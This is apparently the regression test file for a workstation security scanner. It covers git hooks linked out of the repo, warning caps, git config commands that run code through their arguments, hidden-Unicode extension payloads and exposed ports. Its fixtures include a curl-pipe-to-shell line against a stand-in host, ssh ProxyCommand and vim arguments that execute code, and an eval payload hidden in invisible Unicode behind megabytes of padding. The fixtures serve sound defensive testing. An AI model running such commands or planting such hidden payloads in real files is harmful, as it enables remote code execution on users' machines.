// Regression tests for the host-module security review: links out of the repo, caps that hid urgent
// warnings, arguments that run code, big entry points, socket caps, snapshot lifetime.
import assert from "node:assert/strict";
import { chmodSync, mkdirSync, mkdtempSync, realpathSync, rmdirSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
import { createHash } from "node:crypto";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { before, test } from "node:test";
import { HOST_EXTRACTORS } from "../src/sources/extractors/host.ts";
import { freshHome, put, scanHost, summary } from "./host-helpers.ts";

let sources: typeof import("../src/sources.ts");
let types: typeof import("../src/sources/types.ts");
let exposed: typeof import("../src/sources/host/exposed.ts");
let listening: typeof import("../src/sources/host/listening.ts");
let sockets: typeof import("../src/sources/host/sockets.ts");
let commands: typeof import("../src/sources/host/git-commands.ts");
let code: typeof import("../src/sources/host/extensions-editor-code.ts");
let editorDeny: typeof import("../src/sources/host/extensions-editor-denylist.ts");
let browserData: typeof import("../src/sources/host/extensions-browser-data.ts");
let scanMod: typeof import("../src/sources/scan.ts");

before(async () => {
  process.env.SELFGUARD_HOME = freshHome().home;
  sources = await import("../src/sources.ts");
  types = await import("../src/sources/types.ts");
  exposed = await import("../src/sources/host/exposed.ts");
  listening = await import("../src/sources/host/listening.ts");
  sockets = await import("../src/sources/host/sockets.ts");
  commands = await import("../src/sources/host/git-commands.ts");
  code = await import("../src/sources/host/extensions-editor-code.ts");
  editorDeny = await import("../src/sources/host/extensions-editor-denylist.ts");
  browserData = await import("../src/sources/host/extensions-browser-data.ts");
  scanMod = await import("../src/sources/scan.ts");
  sources.resetSourceExtractors();
  sources.registerBuiltinExtractors();
});

/** registerBuiltinExtractors() only works once: put the host ones back by hand. */
const restore = () => {
  sources.resetSourceExtractors();
  for (const e of HOST_EXTRACTORS) sources.registerSourceExtractor(e);
};
const tmp = (p: string) => realpathSync(mkdtempSync(join(tmpdir(), p)));
function repo(config = ""): string {
  const root = tmp("sg-hard-repo-");
  mkdirSync(join(root, ".git", "hooks"), { recursive: true });
  if (config) put(root, ".git/config", config);
  return root;
}
const scan = (root: string) => scanHost(sources, sources.repoTarget(root));

// 1 + 8: links out of the repo ---------------------------------------------------------------

test("a .git/hooks replaced by a link out of the repo is urgent; a hooksPath link out is reported", () => {
  const root = repo();
  const out = tmp("sg-hard-out-");
  put(out, "pre-commit", "#!/bin/sh\necho x\n");
  chmodSync(join(out, "pre-commit"), 0o755);
  rmdirSync(join(root, ".git", "hooks"));
  symlinkSync(out, join(root, ".git", "hooks"));
  const rec = scan(root);
  assert.deepEqual(summary(rec), ["high suspicious-git-hook hooks @hooks:0 N"]);
  assert.equal(rec.warnings[0]!.urgent, true);
  assert.doesNotMatch(JSON.stringify(rec.warnings), new RegExp(out));

  const tracked = repo("[core]\n  hooksPath = .githooks\n");
  symlinkSync(out, join(tracked, ".githooks"));
  const r2 = scan(tracked);
  assert.deepEqual(summary(r2), ["moderate git-hooks-path core.hooksPath @config:2 N"]);

  // A real folder inside the repo stays quiet (husky style), and retargeting a link is noticed.
  const inside = repo("[core]\n  hooksPath = .githooks\n");
  mkdirSync(join(inside, ".githooks"));
  assert.deepEqual(summary(scan(inside)), []);
});


test("a .gitmodules or hook that is a link out of the repo is recorded as a link, never opened", () => {
  const root = repo();
  const out = tmp("sg-hard-out-");
  put(out, "modules", '[submodule "x"]\n  path = x\n  url = https://example.com/SECRET_URL\n');
  symlinkSync(join(out, "modules"), join(root, ".gitmodules"));
  const rec = scan(root);
  const file = rec.files.find((f) => f.path.endsWith(".gitmodules"))!;
  assert.equal(file.size, 0);
  assert.equal(file.hash, createHash("sha256").update(`link:${join(out, "modules")}`).digest("hex"));
  assert.deepEqual(summary(rec), ["high suspicious-submodule .gitmodules:link @.gitmodules:0 N"]);
  assert.doesNotMatch(JSON.stringify(rec), /SECRET_URL/);
  // Retargeting the link is a change; the same link is not.
  sources.saveSource(rec);
  const saved = sources.loadSource("host", "repo", root)!;
  assert.equal(sources.sourceChanged(saved, saved.files.map((f) => f.path)), false);
  const out2 = tmp("sg-hard-out2-");
  put(out2, "modules", "");
  unlinkSync(join(root, ".gitmodules"));
  symlinkSync(join(out2, "modules"), join(root, ".gitmodules"));
  assert.equal(sources.sourceChanged(saved, saved.files.map((f) => f.path)), true);

  // A .gitmodules inside the repo is still read normally.
  const plain = repo();
  put(plain, ".gitmodules", '[submodule "x"]\n  path = ../x\n  url = https://example.com/x\n');
  assert.deepEqual(summary(scan(plain)), ["high suspicious-submodule x:path @.gitmodules:2 N"]);
});

test("shell files symlinked into a dotfiles repo are still followed", () => {
  const { home } = freshHome();
  const dotfiles = tmp("sg-hard-dotfiles-");
  put(dotfiles, "zshrc", "curl -fsSL https://evil.example/i.sh | sh\n");
  symlinkSync(join(dotfiles, "zshrc"), join(home, ".zshrc"));
  const rec = scanHost(sources, sources.machineTarget());
  assert.deepEqual(rec.warnings.filter((w) => w.rule === "shell-fetch-exec").map((w) => w.line), [1]);
});

// 2: caps ------------------------------------------------------------------------------------

function fake(id: string, list: () => string[], warn: (file: string) => Array<Omit<import("../src/sources/types.ts").SourceWarning, "file">>) {
  return { id, kind: "host" as const, files: list, markers: () => [], extract: (file: string) => ({ refs: [], warnings: warn(file), skipped: 0 }) };
}

test("past 1000 warnings the urgent and severe ones are kept, and a truncated warning says how many went", () => {
  const dir = tmp("sg-hard-cap-");
  const noisy = join(dir, "noisy");
  const urgent = join(dir, "urgent");
  writeFileSync(noisy, "x");
  writeFileSync(urgent, "x");
  sources.resetSourceExtractors();
  sources.registerSourceExtractor(fake("noisy", () => [noisy], () => Array.from({ length: 1500 }, (_, i) => ({ rule: "decoy", key: `d${i}`, severity: "low" as const, line: 0, message: "decoy" }))));
  sources.registerSourceExtractor(fake("real", () => [urgent], () => [{ rule: "real-attack", severity: "high", urgent: true, key: "a", line: 0, message: "real" }, { rule: "medium", severity: "moderate", key: "m", line: 0, message: "m" }]));
  try {
    const rec = scanHost(sources, sources.repoTarget(dir));
    assert.equal(rec.warnings.length, 1000);
    assert.ok(rec.warnings.some((w) => w.rule === "real-attack" && w.urgent));
    assert.ok(rec.warnings.some((w) => w.rule === "medium"));
    const cut = rec.warnings.filter((w) => w.rule === "truncated");
    assert.equal(cut.length, 1);
    assert.equal(cut[0]!.severity, "low");
    assert.equal(cut[0]!.file, types.TRUNCATED_FILE);
    assert.match(cut[0]!.message, /^503 more warnings/);
  } finally {
    restore();
  }
});

test("the file cap is fair per extractor, and files left out are reported", () => {
  const dir = tmp("sg-hard-files-");
  const many = Array.from({ length: 250 }, (_, i) => put(dir, `a/${i}.txt`, "x"));
  const mine = put(dir, "b/prefs.json", "{}");
  sources.resetSourceExtractors();
  sources.registerSourceExtractor(fake("many", () => many, () => []));
  sources.registerSourceExtractor(fake("one", () => [mine], () => []));
  try {
    const found = sources.filesFor("host", sources.repoTarget(dir));
    assert.equal(found.size, 200);
    assert.ok(found.has(mine), "the second extractor's file is not pushed out");
    assert.equal(found.dropped, 51);
    const rec = scanHost(sources, sources.repoTarget(dir));
    const w = rec.warnings.filter((x) => x.rule === "truncated");
    assert.equal(w.length, 1);
    assert.match(w[0]!.message, /^51 files were not read/);
    // `check` re-reads the recorded files: the notice stays.
    sources.saveSource(rec);
    const [again] = scanMod.prepareSources([{ kind: "host", target: sources.repoTarget(dir), files: new Map(rec.files.map((f) => [f.path, found.get(f.path)!])) }]).inventories;
    assert.equal(again!.record.warnings.filter((x) => x.rule === "truncated").length, 1);
  } finally {
    restore();
  }
});

test("decoy launch items cannot push the extension lists out of a machine scan", () => {
  const { home } = freshHome();
  for (let i = 0; i < 100; i++) put(home, `Library/LaunchAgents/decoy${i}.plist`, "x");
  for (const d of [".vscode", ".cursor", ".windsurf"]) put(home, `${d}/extensions/extensions.json`, "[]");
  const found = sources.filesFor("host", sources.machineTarget());
  for (const d of [".vscode", ".cursor", ".windsurf"]) assert.ok(found.has(join(home, d, "extensions", "extensions.json")), d);
});

test("editor: a denylisted extension past the entry limit is still found", () => {
  const { home } = freshHome();
  const bad = [...editorDeny.DENYLIST].find(([, e]) => e.versions === null)![0];
  const list = Array.from({ length: 450 }, (_, i) => ({ identifier: { id: `pub.ext${i}` }, version: "1.0.0", relativeLocation: `pub.ext${i}-1.0.0`, metadata: { source: "gallery" } }));
  list.push({ identifier: { id: bad }, version: "1.0.0", relativeLocation: `${bad}-1.0.0`, metadata: { source: "gallery" } });
  put(home, ".vscode/extensions/extensions.json", JSON.stringify(list));
  const rec = scanHost(sources, sources.machineTarget());
  assert.equal(rec.warnings.filter((w) => w.rule === "editor-extension").length, 400);
  assert.deepEqual(rec.warnings.filter((w) => w.rule === "malicious-extension").map((w) => w.key), [bad]);
});

test("browser: a denylisted extension past the per-profile limit is still found", () => {
  const { home } = freshHome();
  const mk = (i: number) => "a".repeat(24) + [...i.toString(16).padStart(8, "0")].map((c) => String.fromCharCode(97 + parseInt(c, 16))).join("");
  const bad = Object.entries(browserData.DENYLIST).find(([, e]) => !e.versions)![0];
  const settings: Record<string, unknown> = {};
  for (let i = 0; i < 200; i++) settings[mk(i)] = { location: 1, path: `${mk(i)}/1.0`, manifest: { name: `e${i}`, version: "1.0" } };
  settings[bad] = { location: 1, path: `${bad}/1.0`, manifest: { name: "evil", version: "1.0" } };
  put(home, "Library/Application Support/Google/Chrome/Default/Secure Preferences", JSON.stringify({ extensions: { settings } }));
  const rec = scanHost(sources, sources.machineTarget());
  assert.equal(rec.warnings.filter((w) => w.rule === "browser-extension").length, 150);
  assert.equal(rec.warnings.filter((w) => w.rule === "malicious-browser-extension").length, 1);
});

// 3: arguments that run code -----------------------------------------------------------------

test("allowed programs that run code through their arguments are flagged; ordinary uses are not", () => {
  const judge = (section: string, sub: string | null, key: string, value: string) => {
    const e = { section, sub, key, value, line: 1 };
    const spec = commands.commandSpec(e);
    return spec ? commands.assess(spec, e) : null;
  };
  for (const [s, sub, k, v] of [
    ["core", null, "sshcommand", "ssh -o ProxyCommand=./p.sh host"],
    ["core", null, "sshcommand", "ssh -oProxyCommand=./p.sh host"],
    ["core", null, "sshcommand", "ssh -o proxycommand=./p.sh host"],
    ["core", null, "sshcommand", "ssh -o LocalCommand=/tmp/x host"],
    ["filter", "x", "clean", "sed e"],
    ["filter", "x", "clean", "sed s/a/b/e"],
    ["core", null, "editor", "vim -S ~/.cache/x.vim"],
    ["core", null, "editor", "nvim -c 'call system(1)'"],
    ["core", null, "editor", "vim +'!sh'"],
    ["core", null, "editor", "nvim --cmd 'set x'"],
  ] as const) {
    const a = judge(s, sub, k, v);
    assert.ok(a?.viaArguments, v);
  }
  for (const [s, sub, k, v] of [
    ["core", null, "sshcommand", "ssh -i ~/.ssh/id_work -o IdentitiesOnly=yes"],
    ["filter", "x", "clean", "sed s/a/b/g"],
    ["filter", "x", "clean", "sed s/^e/x/"],
    ["core", null, "editor", "vim"],
    ["core", null, "editor", "nvim +10"],
    ["core", null, "editor", "code --wait"],
  ] as const) assert.equal(judge(s, sub, k, v), null, v);
  // Every token is checked for temporary and hidden folders, not just the program.
  assert.equal(judge("core", null, "sshcommand", "ssh -o LocalCommand=/tmp/x host")!.oddPlace, true);
  assert.equal(judge("core", null, "editor", "vim -S ~/.cache/x.vim")!.oddPlace, true);
  assert.equal(judge("core", null, "editor", "vim /tmp/notes.txt")!.oddPlace, true);
  assert.equal(judge("core", null, "pager", "less --config /private/tmp/x")!.oddPlace, true);
});

test("repo and machine messages for argument-run code never carry the value", () => {
  const root = repo('[core]\n  sshCommand = ssh -o ProxyCommand=./SECRET_SCRIPT.sh host\n  editor = vim -S /tmp/SECRET_VIM.vim\n');
  const rec = scan(root);
  assert.deepEqual(summary(rec), ["high git-config-command core.sshCommand @config:2 N", "high git-config-command core.editor @config:3 N"]);
  assert.equal(rec.warnings[0]!.urgent, undefined);
  assert.equal(rec.warnings[1]!.urgent, true);
  assert.doesNotMatch(JSON.stringify(rec.warnings), /SECRET/);
  assert.match(rec.warnings[0]!.message, /arguments that make it run another program/);
  const { home } = freshHome();
  put(home, ".gitconfig", "[core]\n  sshCommand = ssh -o ProxyCommand=./SECRET.sh host\n");
  const m = scanHost(sources, sources.machineTarget());
  assert.deepEqual(summary(m).filter((s) => s.includes("git-command-config")), ["moderate git-command-config core.sshCommand @.gitconfig:2 N"]);
  assert.doesNotMatch(JSON.stringify(m.warnings), /SECRET/);
});

// 4: big entry points ------------------------------------------------------------------------

const payload = (s: string) => [...Buffer.from(s)].map((b) => String.fromCodePoint(b < 16 ? 0xfe00 + b : 0xe0100 + b - 16)).join("");

test("padding an entry point past 5 MB does not hide invisible Unicode at its start or end", () => {
  const { home } = freshHome();
  const ent = (id: string) => ({ identifier: { id }, version: "1.0.0", relativeLocation: `${id}-1.0.0`, metadata: { source: "gallery" } });
  put(home, ".vscode/extensions/extensions.json", JSON.stringify([ent("t.head"), ent("t.tail"), ent("t.clean")]));
  const evil = `x='${payload("eval(atob('AAAA'))")}'`;
  const pad = " ".repeat(7 * 1024 * 1024);
  for (const [id, js] of [["t.head", evil + pad], ["t.tail", pad + evil], ["t.clean", pad]] as const) {
    put(home, `.vscode/extensions/${id}-1.0.0/package.json`, JSON.stringify({ main: "./b.js" }));
    put(home, `.vscode/extensions/${id}-1.0.0/b.js`, js);
  }
  const rec = scanHost(sources, sources.machineTarget());
  assert.deepEqual(rec.warnings.filter((w) => w.rule === "hidden-unicode").map((w) => w.key).sort(), ["t.head", "t.tail"]);
});

test("each extension gets a fair share of the scan budget, with a floor", () => {
  assert.deepEqual(code.readPlan(100, 1000), { head: 100, tail: 0 });
  const big = code.readPlan(50 * 1024 * 1024, 64 * 1024 * 1024);
  assert.equal(big.head, 5 * 1024 * 1024);
  assert.equal(big.tail, 1024 * 1024);
  const tight = code.readPlan(50 * 1024 * 1024, 128 * 1024);
  assert.ok(tight.head + tight.tail <= 128 * 1024 && tight.tail > 0 && tight.head > 0);

  // 60 extensions whose bundle is 1.5 MB: the first ones can't use up the shared budget for the last.
  const { home } = freshHome();
  const ids = Array.from({ length: 60 }, (_, i) => `t.e${i}`);
  put(home, ".vscode/extensions/extensions.json", JSON.stringify(ids.map((id) => ({ identifier: { id }, version: "1.0.0", relativeLocation: `${id}-1.0.0`, metadata: { source: "gallery" } }))));
  const filler = "a".repeat(1.5 * 1024 * 1024);
  for (const id of ids) {
    put(home, `.vscode/extensions/${id}-1.0.0/package.json`, JSON.stringify({ main: "./b.js" }));
    put(home, `.vscode/extensions/${id}-1.0.0/b.js`, id === "t.e59" ? `x='${payload("eval(atob('AAAA'))")}'` : filler);
  }
  const rec = scanHost(sources, sources.machineTarget());
  assert.deepEqual(rec.warnings.filter((w) => w.rule === "hidden-unicode").map((w) => w.key), ["t.e59"]);
});

// 5 + 7: sockets -----------------------------------------------------------------------------

test("loopback listeners do not count toward the listener cap", () => {
  const lines: string[] = [];
  for (let i = 0; i < 2500; i++) lines.push(`p${i + 1}`, "cnode", "f5", `n127.0.0.1:${10000 + i}`);
  lines.push("p9999", "cnode", "f5", "n*:9229");
  const l = sockets.parseLsof(lines.join("\n"));
  assert.ok(l.some((s) => s.port === 9229 && s.reach === "wildcard"));
  const rows = ["header"];
  for (let i = 0; i < 2500; i++) rows.push(`${i}: 0100007F:${(10000 + i).toString(16).toUpperCase().padStart(4, "0")} 00000000:0000 0A 0 0 0 0 0 0 ${i + 1000}`);
  rows.push("x: 00000000:2455 00000000:0000 0A 0 0 0 0 0 0 99999");
  assert.ok(sockets.parseProcNet(rows.join("\n")).some((s) => s.port === 9301 && s.reach === "wildcard"));
  // ... but reachable ones still do.
  const many = Array.from({ length: 2500 }, (_, i) => `p${i}\ncx\nn*:${20000 + i}`).join("\n");
  assert.equal(sockets.parseLsof(many).length, 2000);
});

test("lsof exiting 1 with output is parsed; without output it is empty; other failures are unreadable", () => {
  const out = "p1\ncnode\nf5\nn*:3000\n";
  assert.deepEqual(listening.lsofFailure({ status: 1, stdout: out }), [{ port: 3000, reach: "wildcard", command: "node" }]);
  assert.deepEqual(listening.lsofFailure({ status: 1, stdout: Buffer.from(out) }), [{ port: 3000, reach: "wildcard", command: "node" }]);
  assert.deepEqual(listening.lsofFailure({ status: 1, stdout: "" }), []);
  assert.deepEqual(listening.lsofFailure({ status: 1 }), []);
  assert.equal(listening.lsofFailure({ status: 2, stdout: out }), null);
  assert.equal(listening.lsofFailure({ code: "ETIMEDOUT" }), null);
});

test("a system-looking process name cannot hide a risky port, only an ordinary one", () => {
  const w = exposed.exposureWarnings([
    { port: 6379, reach: "wildcard", command: "sharingd" },
    { port: 11434, reach: "lan", command: "rapportd" },
    { port: 52434, reach: "wildcard", command: "sharingd" },
  ]);
  assert.deepEqual(w.map((x) => x.key), ["6379/sharingd", "11434/rapportd"]);
});

// 6: snapshots -------------------------------------------------------------------------------

const EMPTY = { refs: new Map(), vulns: new Map() };
const snap = (rec: { warnings: Array<{ file: string; key?: string }> }) => rec.warnings.filter((w) => w.file === types.SNAPSHOT_FILE).map((w) => w.key);
const take = (target: ReturnType<typeof sources.machineTarget>, now: string, previous?: import("../src/sources/types.ts").SourceRecord) => {
  if (previous) sources.saveSource(previous);
  const [inv] = scanMod.prepareSources([{ kind: "host", target, snapshot: true }], now).inventories;
  return inv!.record;
};

test("sockets disabled or unsupported: the snapshot is empty and old warnings resolve", () => {
  process.env.SELFGUARD_HOME = freshHome().home;
  const target = sources.machineTarget();
  listening.setListeningReader(() => [{ port: 9229, reach: "wildcard", command: "node" }]);
  let first;
  try {
    first = take(target, "2026-01-01T00:00:00.000Z");
    assert.deepEqual(snap(first), ["9229/node"]);
  } finally {
    listening.setListeningReader();
  }
  process.env.SELFGUARD_NO_SOCKETS = "1";
  try {
    const off = take(target, "2026-01-02T00:00:00.000Z", first);
    assert.deepEqual(snap(off), []);
    assert.equal(off.snapshotAt, "2026-01-02T00:00:00.000Z");
    const [done] = sources.finishSources([{ record: off, previous: first }], EMPTY);
    assert.deepEqual(done!.resolvedWarnings.map((w) => w.key), ["9229/node"]);
  } finally {
    delete process.env.SELFGUARD_NO_SOCKETS;
  }
});

test("a failing snapshot keeps the last warnings for 7 days, not longer", () => {
  process.env.SELFGUARD_HOME = freshHome().home;
  const target = sources.machineTarget();
  listening.setListeningReader(() => [{ port: 9229, reach: "wildcard", command: "node" }]);
  try {
    const good = take(target, "2026-01-01T00:00:00.000Z");
    assert.equal(good.snapshotAt, "2026-01-01T00:00:00.000Z");
    listening.setListeningReader(() => null);
    const soon = take(target, "2026-01-05T00:00:00.000Z", good);
    assert.deepEqual(snap(soon), ["9229/node"]);
    assert.equal(soon.snapshotAt, "2026-01-01T00:00:00.000Z", "a failure doesn't renew it");
    // check (no snapshot taken) keeps them as well.
    const viaCheck = scanMod.prepareSources([{ kind: "host", target }], "2026-03-01T00:00:00.000Z").inventories[0]!.record;
    assert.deepEqual(snap(viaCheck), ["9229/node"]);
    const late = take(target, "2026-01-09T00:00:00.000Z", good);
    assert.deepEqual(snap(late), []);
  } finally {
    listening.setListeningReader();
  }
});

test("several snapshot extractors keep the old warnings once", () => {
  process.env.SELFGUARD_HOME = freshHome().home;
  const target = sources.machineTarget();
  const old = { rule: "exposed-dev-service", key: "9229/node", severity: "high" as const, line: 0, message: "m", file: types.SNAPSHOT_FILE };
  const base = { schema: 1 as const, kind: "host" as const, scope: "machine" as const, path: target.root, registeredAt: "x", scannedAt: "2026-01-01T00:00:00.000Z", files: [], refs: [], findings: [], skipped: 0, warnings: [old], snapshotAt: "2026-01-01T00:00:00.000Z" };
  sources.resetSourceExtractors();
  for (const id of ["a", "b"]) sources.registerSourceExtractor({ ...fake(id, () => [], () => []), snapshot: () => { throw new Error("down"); }, extract: () => ({ refs: [], warnings: [], skipped: 0 }) });
  try {
    const rec = take(target, "2026-01-02T00:00:00.000Z", base);
    assert.deepEqual(snap(rec), ["9229/node"]);
  } finally {
    restore();
  }
});
